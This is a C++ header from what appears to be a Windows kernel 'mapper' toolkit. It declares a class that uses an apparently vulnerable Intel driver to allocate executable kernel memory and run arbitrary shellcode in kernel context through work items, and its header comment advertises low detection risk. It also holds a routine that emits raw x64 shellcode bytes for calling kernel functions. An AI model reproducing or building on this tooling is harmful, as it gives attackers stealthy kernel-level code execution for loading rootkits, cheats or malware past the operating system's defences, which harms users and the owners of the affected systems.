/*
 * Work Item Executor
 * Executes shellcode in kernel via IoQueueWorkItem
 * 
 * This is the safest method for kernel code execution:
 * - Uses Windows' own work item system
 * - Runs in system thread context
 * - Low BSOD risk
 * - Low detection risk
 */

#pragma once

#include <windows.h>
#include <cstdint>
#include <vector>
#include <string>
#include <functional>

// Forward declarations to avoid circular includes
namespace mapper {
namespace intel { class IntelDriver; }
namespace symbols { class SymbolResolver; }
}

namespace mapper {
namespace workitem {

// ============================================
// Status Constants
// ============================================

constexpr uint64_t WI_STATUS_PENDING = 0;
constexpr uint64_t WI_STATUS_RUNNING = 1;
constexpr uint64_t WI_STATUS_COMPLETED = 2;
constexpr uint64_t WI_STATUS_ERROR = 3;

// ============================================
// Shared Memory Layout (4KB aligned)
// ============================================

#pragma pack(push, 1)
struct SharedMemoryLayout {
    volatile uint64_t status;         // 0x000: Execution status
    volatile uint64_t result;         // 0x008: Return value
    uint64_t param1;                  // 0x010: First parameter
    uint64_t param2;                  // 0x018: Second parameter  
    uint64_t param3;                  // 0x020: Third parameter
    uint64_t param4;                  // 0x028: Fourth parameter
    uint64_t functionAddr;            // 0x030: Function to call
    uint64_t reserved[25];            // 0x038-0x0FF: Reserved
    uint8_t shellcode[0xF00];         // 0x100-0xFFF: Shellcode area
};
#pragma pack(pop)

static_assert(sizeof(SharedMemoryLayout) <= 0x1000, "SharedMemoryLayout must fit in one page");

constexpr size_t SHARED_MEMORY_SIZE = 0x1000;

// ============================================
// Execution Result
// ============================================

struct ExecutionResult {
    bool success;
    uint64_t returnValue;
    uint32_t errorCode;
    std::string errorMessage;
    
    ExecutionResult() : success(false), returnValue(0), errorCode(0) {}
};

// ============================================
// Kernel Functions Structure
// ============================================

struct KernelFunctions {
    uint64_t ExAllocatePool2;
    uint64_t ExAllocatePoolWithTag;
    uint64_t ExFreePoolWithTag;
    uint64_t IoAllocateWorkItem;
    uint64_t IoInitializeWorkItem;
    uint64_t IoQueueWorkItemEx;
    uint64_t IoFreeWorkItem;
    uint64_t MmCopyVirtualMemory;
    uint64_t KeWaitForSingleObject;
    uint64_t KeSetEvent;
};

// ============================================
// Work Item Executor Class
// ============================================

class WorkItemExecutor {
public:
    WorkItemExecutor();
    ~WorkItemExecutor();
    
    // Prevent copying
    WorkItemExecutor(const WorkItemExecutor&) = delete;
    WorkItemExecutor& operator=(const WorkItemExecutor&) = delete;
    
    // Initialize with Intel driver and kernel base
    bool Initialize(intel::IntelDriver* driver, uint64_t kernelBase);
    
    // Alternative: Initialize with Intel driver and SymbolResolver
    bool Initialize(intel::IntelDriver& driver, symbols::SymbolResolver& symbols);
    
    // Execute shellcode in kernel context
    bool ExecuteShellcode(
        const void* shellcode,
        size_t shellcodeSize,
        uint64_t param1 = 0,
        uint64_t param2 = 0,
        uint64_t param3 = 0,
        uint64_t* result = nullptr,
        uint32_t timeout_ms = 5000
    );
    
    // Execute kernel function directly
    ExecutionResult CallKernelFunction(
        uint64_t functionAddress,
        uint64_t arg1 = 0,
        uint64_t arg2 = 0,
        uint64_t arg3 = 0,
        uint64_t arg4 = 0
    );
    
    // Memory allocation helpers
    uint64_t AllocateKernelMemory(size_t size, uint32_t poolTag, bool executable = false);
    void FreeKernelMemory(uint64_t address, uint32_t poolTag);
    
    // High-level pool helpers
    uint64_t AllocatePool(uint64_t size, uint32_t tag = 'pMkW');
    bool FreePool(uint64_t address);
    
    // Cleanup
    void Cleanup();
    
    // Check if initialized
    bool IsInitialized() const { return m_initialized; }
    
private:
    intel::IntelDriver* m_driver;
    uint64_t m_sharedMemoryPhys;      // Physical address of shared memory
    uint64_t m_sharedMemoryKernel;    // Kernel virtual address (if mapped)
    uint64_t m_workItemAddr;          // IO_WORKITEM address
    uint64_t m_ioObjectAddr;          // IO object for work item
    bool m_initialized;
    uint64_t m_kernelBase;
    
    KernelFunctions m_kernelFuncs;
    
    // Internal methods
    bool ResolveKernelFunctions();
    bool AllocateSharedMemory();
    bool CreateWorkItem();
    uint64_t TranslateKernelVA(uint64_t kernelVA);
    void Log(const char* format, ...);
};

// ============================================
// Shellcode Generator
// ============================================

namespace shellcode {

// Generate shellcode for calling ExAllocatePoolWithTag
std::vector<uint8_t> GenerateAllocatePoolShellcode(
    uint64_t exAllocatePoolAddr,
    uint32_t poolType,
    uint64_t size,
    uint32_t tag,
    uint64_t resultAddr
);

// Generate shellcode for calling a generic function
std::vector<uint8_t> GenerateCallFunctionShellcode(
    uint64_t functionAddr,
    uint64_t arg1,
    uint64_t arg2,
    uint64_t arg3,
    uint64_t arg4,
    uint64_t resultAddr,
    uint64_t statusAddr
);

// Generate universal worker routine shellcode
inline std::vector<uint8_t> GenerateUniversalShellcode(uint64_t sharedMemoryAddr) {
    std::vector<uint8_t> code;
    
    // Save non-volatile registers
    code.insert(code.end(), {0x53});                     // push rbx
    code.insert(code.end(), {0x56});                     // push rsi
    code.insert(code.end(), {0x57});                     // push rdi
    code.insert(code.end(), {0x41, 0x54});               // push r12
    code.insert(code.end(), {0x41, 0x55});               // push r13
    code.insert(code.end(), {0x41, 0x56});               // push r14
    code.insert(code.end(), {0x41, 0x57});               // push r15
    
    // Allocate shadow space (0x28 = 40 bytes, 32 for args + 8 for alignment)
    code.insert(code.end(), {0x48, 0x83, 0xEC, 0x28});   // sub rsp, 0x28
    
    // Load shared memory base into r12
    code.insert(code.end(), {0x49, 0xBC});               // mov r12, imm64
    for (int i = 0; i < 8; i++) {
        code.push_back((sharedMemoryAddr >> (i * 8)) & 0xFF);
    }
    
    // Set status to RUNNING
    // mov qword ptr [r12], WI_STATUS_RUNNING (1)
    code.insert(code.end(), {0x49, 0xC7, 0x04, 0x24, 0x01, 0x00, 0x00, 0x00});
    
    // Load function address from offset 0x30
    // mov rax, [r12 + 0x30]
    code.insert(code.end(), {0x49, 0x8B, 0x44, 0x24, 0x30});
    
    // Load arguments (Windows x64 calling convention)
    // rcx = arg1 from [r12 + 0x10]
    code.insert(code.end(), {0x49, 0x8B, 0x4C, 0x24, 0x10});
    // rdx = arg2 from [r12 + 0x18]
    code.insert(code.end(), {0x49, 0x8B, 0x54, 0x24, 0x18});
    // r8 = arg3 from [r12 + 0x20]
    code.insert(code.end(), {0x4D, 0x8B, 0x44, 0x24, 0x20});
    // r9 = arg4 from [r12 + 0x28]
    code.insert(code.end(), {0x4D, 0x8B, 0x4C, 0x24, 0x28});
    
    // Call the function
    code.insert(code.end(), {0xFF, 0xD0});               // call rax
    
    // Store return value at offset 0x08
    // mov [r12 + 0x08], rax
    code.insert(code.end(), {0x49, 0x89, 0x44, 0x24, 0x08});
    
    // Set status to COMPLETED
    // mov qword ptr [r12], WI_STATUS_COMPLETED (2)
    code.insert(code.end(), {0x49, 0xC7, 0x04, 0x24, 0x02, 0x00, 0x00, 0x00});
    
    // Deallocate shadow space
    code.insert(code.end(), {0x48, 0x83, 0xC4, 0x28});   // add rsp, 0x28
    
    // Restore non-volatile registers
    code.insert(code.end(), {0x41, 0x5F});               // pop r15
    code.insert(code.end(), {0x41, 0x5E});               // pop r14
    code.insert(code.end(), {0x41, 0x5D});               // pop r13
    code.insert(code.end(), {0x41, 0x5C});               // pop r12
    code.insert(code.end(), {0x5F});                     // pop rdi
    code.insert(code.end(), {0x5E});                     // pop rsi
    code.insert(code.end(), {0x5B});                     // pop rbx
    
    // Return
    code.push_back(0xC3);                                // ret
    
    return code;
}

} // namespace shellcode

} // namespace workitem
} // namespace mapper
